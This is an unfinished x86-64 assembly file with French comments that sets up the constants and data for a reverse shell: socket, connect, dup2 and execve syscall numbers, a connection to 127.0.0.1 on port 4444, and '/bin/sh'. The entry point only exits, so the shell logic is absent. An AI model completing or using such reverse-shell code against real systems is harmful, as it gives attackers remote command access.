section .data
    ; Constantes pour les appels sys
    SYS_SOCKET equ 41
    SYS_CONNECT equ 42
    SYS_DUP2 equ 33
    SYS_EXECVE equ 59
    SYS_EXIT equ 60

    ; Constantes pour socket
    AF_INET equ 2
    SOCK_STREAM equ 1
    IPPROTO_IP equ 0

    ; Config de la connexion
    ip dd 0x0100007f       ; 127.0.0.1 en format réseau (little-endian)
    port dw 0x5c11         ; Port 4444 (0x115c)

    ; Messages d'erreur
    error_socket db "Erreur lors de la création du socket", 10, 0
    error_connect db "Erreur de connexion au serveur", 10, 0
    
    ; path pour shell
    shell db "/bin/sh", 0
    args db 0
    env db 0

section .bss
    sockaddr_in resb 16

section .text
    global _start

_start:

    ; END
    mov rax, SYS_EXIT
    xor rdi, rdi
    syscall

